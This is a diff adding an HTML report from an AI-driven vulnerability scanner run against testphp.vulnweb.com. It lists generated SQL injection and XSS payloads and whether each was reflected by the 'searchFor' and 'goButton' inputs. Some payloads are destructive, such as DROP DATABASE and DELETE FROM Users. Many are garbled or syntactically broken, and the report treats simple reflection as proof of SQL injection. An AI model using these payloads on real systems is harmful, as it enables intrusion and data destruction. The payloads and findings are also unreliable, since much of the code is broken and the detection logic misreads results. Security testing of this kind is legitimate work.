@@ -1,0 +1,139 @@
+<h1>AI Vulnerability Scan Report</h1><p><strong>Target:</strong> http://testphp.vulnweb.com/</p><p><strong>Generated:</strong> 2025-04-23_00-53-14</p><hr><h2>Form: http://testphp.vulnweb.com/search.php?test=query</h2><p>Method: post</p><p>Inputs: searchFor, goButton</p><details><summary><strong>AI Output</strong></summary><pre>SQLi:
+- ' OR '1'='1%'; --
+- 'Robert'); DROP TABLE Students;--
+- '; DELETE FROM Users WHERE Username = '';--
+- '); SELECT * From AdminInfo;--
+- '" //& "' AND id=0 UNION ALL SELECT 1,2,3,-an+eolxss';
+- 'admin' OR 1/0=1; --
+- `'admin');SELECT NULL;`
+- `anything'' AND SLEEP(8) -- (time bomb)
+- '; DROP DATABASE search_engine;--
+- 'Robert');DELETE FROM Users WHERE Username = '';
+- '%3Cscript%20src=xsscript.asp%3E%2F<script%3E'; // Cross Site Scripting
+
+XSS:
+- '<img src="javascript:(function(){alert(1)})" onerror=prompt("Test")>',  # DOM-based XSS
+- '><input type="text"><xss>' (where xss is a script tag or another payload)
+- '<a href=http://example.com/evil.php?q=' + encodeURIComponent('<svg viewBox="0 0 1048 768" width="25%" height="auto">' + '</svg>')+'>LinkedIn profile picture with CROSS-SITE XSS payload (valid URL but contains script)
+- '<a href=http://evil.example/hack?q=' + encodeURIComponent('<img src="/flag{}.png" onerror=prompt("XSS")>')+'>URLencoded <script> for CROSS-SITE XSS payload (valid URL but contains script)
+- '"><svg xmlns="http://www.w3.org/2static/' + encodeURIComponent('<img src="/flag{}.png" onerror=prompt("XSS")><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle">%c</text>')+'>URLencoded image with CROSS-SITE XSS payload (with script)
+- '"><svg xmlns="http://www.w3.org/2static/' + encodeURIComponent('<img src="/flag{}.png" onerror=prompt("XSS")><foreignObject width="100%" height="inherit">%c</foreignObject>')+'>URLencoded image with CROSS-SITE XSS payload (with script)
+- '"><svg xmlns="http://www.w3.org/2static/" viewBox="0 0 576 768" width="100%" height="auto">%c</svg> # Encoded inline event for simple CROSS-SITE XSS payload (image but contains script)
+- '"><img src="/flag{}.png?random=' + Math.ceil(Maths.random() * 65536) + '" onerror=prompt("XSS")> # Encoded inline event for simple CROSS-SITE XSS payload (image but contains script and random query string to prevent cache busting
+- '"><img src="/flag{}.png?foo='+encodeURIComponent('onerror="alert(1)"') + '" onerror=prompt("XSS")> # Encoded inline event for simple CROSS-SITE XSS payload (image but contains script and random query string to prevent cache busting
+
+</pre></details><hr><h3>XSS Test</h3><pre>Input Tested: searchFor
+Payload: '<img src="javascript:(function(){alert(1)})" onerror=prompt("Test")>',  # DOM-based XSS
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: goButton
+Payload: '<img src="javascript:(function(){alert(1)})" onerror=prompt("Test")>',  # DOM-based XSS
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: searchFor
+Payload: '><input type="text"><xss>' (where xss is a script tag or another payload)
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: goButton
+Payload: '><input type="text"><xss>' (where xss is a script tag or another payload)
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: searchFor
+Payload: '<a href=http://example.com/evil.php?q=' + encodeURIComponent('<svg viewBox="0 0 1048 768" width="25%" height="auto">' + '</svg>')+'>LinkedIn profile picture with CROSS-SITE XSS payload (valid URL but contains script)
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: goButton
+Payload: '<a href=http://example.com/evil.php?q=' + encodeURIComponent('<svg viewBox="0 0 1048 768" width="25%" height="auto">' + '</svg>')+'>LinkedIn profile picture with CROSS-SITE XSS payload (valid URL but contains script)
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: searchFor
+Payload: '<a href=http://evil.example/hack?q=' + encodeURIComponent('<img src="/flag{}.png" onerror=prompt("XSS")>')+'>URLencoded <script> for CROSS-SITE XSS payload (valid URL but contains script)
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: goButton
+Payload: '<a href=http://evil.example/hack?q=' + encodeURIComponent('<img src="/flag{}.png" onerror=prompt("XSS")>')+'>URLencoded <script> for CROSS-SITE XSS payload (valid URL but contains script)
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: searchFor
+Payload: '"><svg xmlns="http://www.w3.org/2static/' + encodeURIComponent('<img src="/flag{}.png" onerror=prompt("XSS")><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle">%c</text>')+'>URLencoded image with CROSS-SITE XSS payload (with script)
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: goButton
+Payload: '"><svg xmlns="http://www.w3.org/2static/' + encodeURIComponent('<img src="/flag{}.png" onerror=prompt("XSS")><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle">%c</text>')+'>URLencoded image with CROSS-SITE XSS payload (with script)
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: searchFor
+Payload: '"><svg xmlns="http://www.w3.org/2static/' + encodeURIComponent('<img src="/flag{}.png" onerror=prompt("XSS")><foreignObject width="100%" height="inherit">%c</foreignObject>')+'>URLencoded image with CROSS-SITE XSS payload (with script)
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: goButton
+Payload: '"><svg xmlns="http://www.w3.org/2static/' + encodeURIComponent('<img src="/flag{}.png" onerror=prompt("XSS")><foreignObject width="100%" height="inherit">%c</foreignObject>')+'>URLencoded image with CROSS-SITE XSS payload (with script)
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: searchFor
+Payload: '"><svg xmlns="http://www.w3.org/2static/" viewBox="0 0 576 768" width="100%" height="auto">%c</svg> # Encoded inline event for simple CROSS-SITE XSS payload (image but contains script)
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: goButton
+Payload: '"><svg xmlns="http://www.w3.org/2static/" viewBox="0 0 576 768" width="100%" height="auto">%c</svg> # Encoded inline event for simple CROSS-SITE XSS payload (image but contains script)
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: searchFor
+Payload: '"><img src="/flag{}.png?random=' + Math.ceil(Maths.random() * 65536) + '" onerror=prompt("XSS")> # Encoded inline event for simple CROSS-SITE XSS payload (image but contains script and random query string to prevent cache busting
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: goButton
+Payload: '"><img src="/flag{}.png?random=' + Math.ceil(Maths.random() * 65536) + '" onerror=prompt("XSS")> # Encoded inline event for simple CROSS-SITE XSS payload (image but contains script and random query string to prevent cache busting
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: searchFor
+Payload: '"><img src="/flag{}.png?foo='+encodeURIComponent('onerror="alert(1)"') + '" onerror=prompt("XSS")> # Encoded inline event for simple CROSS-SITE XSS payload (image but contains script and random query string to prevent cache busting
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>XSS Test</h3><pre>Input Tested: goButton
+Payload: '"><img src="/flag{}.png?foo='+encodeURIComponent('onerror="alert(1)"') + '" onerror=prompt("XSS")> # Encoded inline event for simple CROSS-SITE XSS payload (image but contains script and random query string to prevent cache busting
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: ' OR '1'='1%';
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: ' OR '1'='1%';
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: 'Robert'); DROP TABLE Students;
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: 'Robert'); DROP TABLE Students;
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: '; DELETE FROM Users WHERE Username = '';
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: '; DELETE FROM Users WHERE Username = '';
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: '); SELECT * From AdminInfo;
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: '); SELECT * From AdminInfo;
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: '" //& "' AND id=0 UNION ALL SELECT 1,2,3,-an+eolxss';
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: '" //& "' AND id=0 UNION ALL SELECT 1,2,3,-an+eolxss';
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: 'admin' OR 1/0=1;
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: 'admin' OR 1/0=1;
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: `'admin');SELECT NULL;`
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: `'admin');SELECT NULL;`
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: `anything'' AND SLEEP(8) -- (time bomb)
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: `anything'' AND SLEEP(8) -- (time bomb)
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: '; DROP DATABASE search_engine;
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: '; DROP DATABASE search_engine;
+Result: ✅ No issue detected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: searchFor
+Payload: 'Robert');DELETE FROM Users WHERE Username = '';
+Result: 🛑 Payload reflected
+Status Code: 200</pre><hr><h3>SQLi Test</h3><pre>Input Tested: goButton
+Payload: 'Robert');DELETE FROM Users WHERE Username = '';
+Result: ✅ No issue detected
+Status Code: 200</pre>
